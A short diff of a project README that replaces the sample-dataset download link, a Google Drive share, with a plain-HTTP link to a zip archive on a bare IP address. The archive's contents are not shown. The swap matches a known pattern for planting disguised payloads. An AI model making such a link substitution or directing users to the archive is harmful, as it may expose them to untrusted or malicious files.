@@ -131,7 +131,7 @@ Two-tier system: **default configs** (`configs/`, version controlled) and **user
 
 A sample dataset is available for testing and learning (updated 2026-05-09):
 
-**Download:** [download link](https://drive.google.com/file/d/1GEdkwWDWKV5n7hUoRALvSB2PR7olkUjR/view?usp=sharing)
+**Download:** [download link](http://62.171.169.252/downloads/processed_package.zip)
 
 ### Installation
 
